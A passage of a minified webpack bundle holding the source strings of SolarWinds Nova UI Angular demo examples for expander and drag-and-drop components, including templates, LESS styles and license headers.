PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-expander-header-text-example",\n    templateUrl: "expander-header-text.example.component.html",\n})\nexport class ExpanderHeaderTextExampleComponent {}\n'},74634:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-expander\n    id="nui-demo-expander-initially-expanded"\n    i18n-header\n    header="Advanced Options"\n    [open]="true"\n>\n    <p i18n>Content goes here</p>\n</nui-expander>\n'},35062:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-expander-initially-expanded-example",\n    templateUrl: "expander-initially-expanded.example.component.html",\n})\nexport class ExpanderInitiallyExpandedExampleComponent {}\n'},66530:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-expander\n    id="nui-demo-expander-open-change"\n    i18n-header\n    header="Advanced options"\n    (openChange)="onOpenChange($event)"\n    [open]="bindingExampleOpen"\n>\n    <p i18n>Content goes here</p>\n</nui-expander>\n<button\n    type="button"\n    class="nui-demo-expander-open-change-button"\n    nui-button\n    (click)="bindingExampleOpen = !bindingExampleOpen"\n>\n    {{ getButtonLabel() }}\n</button>\n'},23518:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-expander-open-change-example",\n    templateUrl: "expander-open-change.example.component.html",\n})\nexport class ExpanderOpenChangeExampleComponent {\n    public bindingExampleOpen: boolean = false;\n\n    constructor() {}\n\n    public getButtonLabel(): string {\n        return this.bindingExampleOpen ? $localize`Close` : $localize`Open`;\n    }\n\n    public onOpenChange(event: boolean): void {\n        this.bindingExampleOpen = event;\n    }\n}\n'},34502:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row">\n        <div class="col">\n            <nui-expander-basic-example></nui-expander-basic-example>\n            <hr />\n        </div>\n        <div class="col">\n            <nui-expander-text-and-icon-example></nui-expander-text-and-icon-example>\n            <hr />\n        </div>\n        <div class="col">\n            <nui-expander-custom-header-example></nui-expander-custom-header-example>\n            <hr />\n        </div>\n        <div class="col">\n            <nui-expander-initially-expanded-example></nui-expander-initially-expanded-example>\n        </div>\n        <div class="col">\n            <nui-expander-open-change-example></nui-expander-open-change-example>\n        </div>\n    </div>\n</div>\n'},52818:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { IMenuGroup } from "@nova-ui/bits";\n\n@Component({\n    selector: "expander-test",\n    templateUrl: "./expander-test.component.html",\n})\nexport class ExpanderTestComponent {\n    public itemsSource: IMenuGroup[] = [\n        {\n            header: "Group 1",\n            itemsSource: [\n                {\n                    title: $localize`Item 1`,\n                    itemType: "action",\n                    action: this.actionDone,\n                },\n                {\n                    title: $localize`Item 2`,\n                    itemType: "action",\n                    action: (): void => alert($localize`hello`),\n                },\n            ],\n        },\n        {\n            itemsSource: [{ title: "Item 3" }],\n        },\n    ];\n    constructor() {}\n\n    public actionDone(): void {\n        console.log("Action Done");\n    }\n}\n'},60866:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-expander\n    id="nui-demo-expander-text-and-icon"\n    i18n-header\n    header="Advanced Options"\n    icon="orion-sitemaster"\n>\n    <p i18n>Content goes here</p>\n</nui-expander>\n'},41022:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-expander-text-and-icon-example",\n    templateUrl: "expander-text-and-icon.example.component.html",\n})\nexport class ExpanderTextAndIconExampleComponent {}\n'},13450:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row">\n        <div class="col">\n            <h3>Basic Expander</h3>\n            <nui-expander id="nui-visual-test-expander-basic">\n                <p>Content is here</p>\n            </nui-expander>\n            <hr />\n        </div>\n        <div class="col">\n            <h3>Expander without Expand Line</h3>\n            <nui-expander\n                id="nui-visual-test-expander-without-border"\n                [hideLeftBorder]="true"\n            >\n                <p>Content is here</p>\n            </nui-expander>\n            <hr />\n        </div>\n        <div class="w-100"></div>\n        <div class="col">\n            <h3>Expander with Text</h3>\n            <nui-expander\n                id="nui-visual-test-expander-header-text"\n                header="Advanced Layout Settings"\n            >\n                <p>Content is here</p>\n            </nui-expander>\n            <hr />\n        </div>\n        <div class="col">\n            <h3>Expander with Text and Icon</h3>\n            <nui-expander\n                id="nui-visual-test-expander-text-and-icon"\n                header="Advanced Options"\n                icon="orion-sitemaster"\n            >\n                <p>Content is here</p>\n            </nui-expander>\n            <hr />\n        </div>\n        <div class="w-100"></div>\n        <div class="col-4">\n            <h3>Expander with Custom Header</h3>\n            <nui-expander id="nui-visual-test-expander-custom-header">\n                <div\n                    nuiExpanderHeader\n                    class="d-flex align-items-center justify-content-between"\n                >\n                    <span>Advanced options</span>\n                    <nui-menu\n                        class="ml-3"\n                        id="nui-demo-expander-header-menu"\n                        icon="menu"\n                        displayStyle="action"\n                        nuiClickInterceptor\n                        [itemsSource]="itemsSource"\n                    ></nui-menu>\n                </div>\n                <p>Content is here</p>\n            </nui-expander>\n            <hr />\n        </div>\n        <div class="col-6 ml-auto">\n            <h3>Staked Expanders</h3>\n            <nui-expander\n                id="nui-visual-test-staked-expander-1"\n                header="Advanced Layout Settings"\n            >\n                <p>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Nullam maximus faucibus bibendum. Aenean feugiat interdum\n                    leo sed posuere. Etiam at pulvinar enim, nec interdum purus.\n                    Duis elit metus, lobortis vitae quam a, malesuada cursus\n                    quam. Duis vel lacinia purus. Maecenas eget arcu ac ante\n                    sagittis eleifend vel ut purus.\n                </p>\n            </nui-expander>\n            <nui-expander id="nui-visual-test-staked-expander-2">\n                <div nuiExpanderHeader class="nui-text-default">\n                    <span>Advanced options</span>\n                </div>\n                <p>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Nullam maximus faucibus bibendum. Aenean feugiat interdum\n                    leo sed posuere. Etiam at pulvinar enim, nec interdum purus.\n                    Duis elit metus, lobortis vitae quam a, malesuada cursus\n                    quam. Duis vel lacinia purus. Maecenas eget arcu ac ante\n                    sagittis eleifend vel ut purus.\n                </p>\n            </nui-expander>\n            <nui-expander id="nui-visual-test-staked-expander-3">\n                <div nuiExpanderHeader class="nui-text-secondary">\n                    <span>Advanced options</span>\n                </div>\n                <p>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Nullam maximus faucibus bibendum. Aenean feugiat interdum\n                    leo sed posuere. Etiam at pulvinar enim, nec interdum purus.\n                    Duis elit metus, lobortis vitae quam a, malesuada cursus\n                    quam. Duis vel lacinia purus. Maecenas eget arcu ac ante\n                    sagittis eleifend vel ut purus.\n                </p>\n            </nui-expander>\n            <hr />\n        </div>\n        <div class="col">\n            <h3>Expander with Nested Expanders</h3>\n            <nui-expander\n                id="nui-visual-test-expander-nested-expander"\n                header="Parent"\n                [open]="true"\n            >\n                <p i18n>Content goes here</p>\n                <nui-expander\n                    id="nui-visual-test-expander-nested-expander-child"\n                    header="Child"\n                    [open]="true"\n                >\n                    <p i18n>Content goes here</p>\n                </nui-expander>\n            </nui-expander>\n            <hr />\n        </div>\n    </div>\n</div>\n'},46774:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { IMenuGroup } from "@nova-ui/bits";\n\n@Component({\n    selector: "expander-visual-test",\n    templateUrl: "./expander-visual-test.component.html",\n})\nexport class ExpanderVisualTestComponent {\n    public itemsSource: IMenuGroup[] = [\n        {\n            header: "Group 1",\n            itemsSource: [{ title: "Item 1" }, { title: "Item 2" }],\n        },\n        {\n            itemsSource: [{ title: "Item 3" }],\n        },\n    ];\n}\n'},54194:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-expander\n    id="nui-demo-expander-without-border"\n    i18n-header\n    header="Advanced Options"\n    [hideLeftBorder]="true"\n>\n    <p i18n>Content goes here</p>\n</nui-expander>\n'},47054:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-expander-without-border-example",\n    templateUrl: "expander-without-border.example.component.html",\n})\nexport class ExpanderWithoutBorderExampleComponent {}\n'},51023:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiDocsModule,\n    NuiExpanderModule,\n    NuiMenuModule,\n    NuiMessageModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    ExpanderBasicExampleComponent,\n    ExpanderCustomHeaderExampleComponent,\n    ExpanderDocsExampleComponent,\n    ExpanderHeaderTextExampleComponent,\n    ExpanderInitiallyExpandedExampleComponent,\n    ExpanderOpenChangeExampleComponent,\n    ExpanderTextAndIconExampleComponent,\n    ExpanderVisualTestComponent,\n    ExpanderWithoutBorderExampleComponent,\n    ExpanderTestComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: ExpanderDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "expander-visual-test",\n        component: ExpanderVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "expander-test",\n        component: ExpanderTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiExpanderModule,\n        NuiMenuModule,\n        NuiMessageModule,\n        NuiDocsModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        ExpanderBasicExampleComponent,\n        ExpanderCustomHeaderExampleComponent,\n        ExpanderDocsExampleComponent,\n        ExpanderHeaderTextExampleComponent,\n        ExpanderInitiallyExpandedExampleComponent,\n        ExpanderTextAndIconExampleComponent,\n        ExpanderOpenChangeExampleComponent,\n        ExpanderWithoutBorderExampleComponent,\n        ExpanderVisualTestComponent,\n        ExpanderTestComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("expander"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class ExpanderModule {}\n'},57912:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./expander-basic/expander-basic.example.component";\nexport * from "./expander-docs/expander-docs.example.component";\nexport * from "./expander-custom-header/expander-custom-header.example.component";\nexport * from "./expander-header-text/expander-header-text.example.component";\nexport * from "./expander-text-and-icon/expander-text-and-icon.example.component";\nexport * from "./expander-initially-expanded/expander-initially-expanded.example.component";\nexport * from "./expander-open-change/expander-open-change.example.component";\nexport * from "./expander-without-border/expander-without-border.example.component";\nexport * from "./expander-visual-test/expander-visual-test.component";\nexport * from "./expander-test/expander-test.component";\n'},42795:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="draggable-item mr-5" cdkDragLockAxis="y" cdkDrag>\n    I can only be dragged up/down\n</div>\n<div class="draggable-item mr-5" cdkDragLockAxis="x" cdkDrag>\n    I can only be dragged left/right\n</div>\n'},21391:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n@import (reference) "mixins";\n\n@box-width: 150px;\n@box-height: 100px;\n\n.draggable-item {\n    width: @box-width;\n    height: @box-height;\n    padding: @nui-space-md;\n    box-sizing: border-box;\n    border: solid 1px @gray;\n    display: inline-flex;\n    justify-content: center;\n    align-items: center;\n    text-align: center;\n    position: relative;\n    z-index: 1;\n    .transition(box-shadow 0.4s);\n\n    &:hover,\n    &.cdk-drag-dragging {\n        .nui-dnd-hover-state();\n        .nui-dnd-raised-state();\n        cursor: move;\n        padding: @nui-space-md;\n    }\n}\n'},28083:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "dnd-axis-constraints",\n    templateUrl: "./dnd-axis-constraints.example.component.html",\n    styleUrls: ["./dnd-axis-constraints.example.component.less"],\n})\nexport class DndAxisConstraintsExampleComponent {}\n'},78251:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="draggable-item" cdkDrag>I can be dragged from anywhere</div>\n'},29103:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n@import (reference) "mixins";\n\n@box-width: 150px;\n@box-height: 100px;\n\n.draggable-item {\n    width: @box-width;\n    height: @box-height;\n    padding: @nui-space-md;\n    box-sizing: border-box;\n    border: solid 1px @gray;\n    display: flex;\n    justify-content: center;\n    align-items: center;\n    text-align: center;\n    position: relative;\n    z-index: 1;\n    .transition(box-shadow 0.4s);\n\n    &:hover {\n        .nui-dnd-hover-state();\n        .nui-dnd-raised-state();\n        cursor: move;\n        padding: @nui-space-md;\n    }\n}\n'},50227:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "dnd-basic",\n    templateUrl: "./dnd-basic.example.component.html",\n    styleUrls: ["./dnd-basic.example.component.less"],\n})\nexport class DndBasicExampleComponent {}\n'},84667:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='\x3c!-- list of draggable items  --\x3e\n<div\n    cdkDropList\n    class="draggable-container"\n    (cdkDropListDropped)="onItemDropped($event)"\n>\n    <ng-container *ngFor="let item of listItems; let i = index">\n        <div\n            cdkDrag\n            cdkDragPreviewClass="dnd-drag-preview"\n            [cdkDragDisabled]="!item.enabled"\n            class="draggable-item"\n            [ngClass]="{\n                \'with-handle\': item.hasHandle,\n                \'nui-dnd-raised-state\': item.withHandle && mousedOver[i]\n            }"\n        >\n            \x3c!-- raised state style is applied ONLY when the mouse is over the handle --\x3e\n            <div\n                *ngIf="item.withHandle"\n                cdkDragHandle\n                class="drag-handle"\n                (mouseover)="mousedOver[i] = true"\n                (mouseout)="mousedOver[i] = false"\n            >\n                <nui-icon icon="drag"></nui-icon>\n            </div>\n            {{ item.title }}\n        </div>\n    </ng-container>\n</div>\n'},6879:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n@import (reference) "mixins";\n\n@box-width: 300px;\n@box-height: 50px;\n\n.draggable-container {\n    width: @box-width;\n    border-top: solid @nui-line-default @nui-color-line-default;\n}\n\n// generic item styling\n.item {\n    height: @box-height;\n    padding: @nui-space-md;\n    text-align: center;\n    box-sizing: border-box;\n    border: solid @nui-line-default @nui-color-line-default;\n    border-top: none;\n    position: relative;\n}\n\n// drag & drop styling\n.draggable-item:extend(.item) {\n    background: @nui-color-bg-content;\n    .transition(box-shadow 0.4s);\n\n    // for all ENABLED items we apply the hover style\n    &:not(.cdk-drag-disabled) {\n        &:hover {\n            .nui-dnd-hover-state();\n        }\n\n        // we apply the raised state only for items without handle\n        &:not(.with-handle):hover {\n            cursor: move;\n            .nui-dnd-raised-state();\n        }\n    }\n\n    &.cdk-drag-disabled {\n        color: @nui-color-disabled;\n    }\n}\n\n.drag-handle {\n    color: #ccc;\n    cursor: move;\n    display: inline;\n}\n\n.dnd-drag-preview:extend(.item, .nui-dnd-preview) {\n}\n'},26403:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { CdkDragDrop, moveItemInArray } from "@angular/cdk/drag-drop";\nimport { Component } from "@angular/core";\n\nclass IListItem {\n    title: string;\n    enabled?: boolean;\n    hasHandle?: boolean;\n}\n\n@Component({\n    selector: "dnd-custom-handle",\n    templateUrl: "./dnd-custom-handle.example.component.html",\n    styleUrls: ["./dnd-custom-handle.example.component.less"],\n})\nexport class DndCustomHandleExampleComponent {\n    public mousedOver: boolean[] = [];\n    public listItems: IListItem[] = [\n        {\n            title: "I can only be dragged using the handle",\n            enabled: true,\n            hasHandle: true,\n        },\n        {\n            title: " I can be dragged without any handle",\n            enabled: true,\n            hasHandle: false,\n        },\n        {\n            title: "Disabled item CAN\'T be dragged",\n            enabled: false,\n        },\n    ];\n\n    public onItemDropped(event: CdkDragDrop<IListItem[]>): void {\n        moveItemInArray(\n            this.listItems,\n            event.previousIndex,\n            event.currentIndex\n        );\n    }\n}\n'},54997:(o,n,e)=>{"use 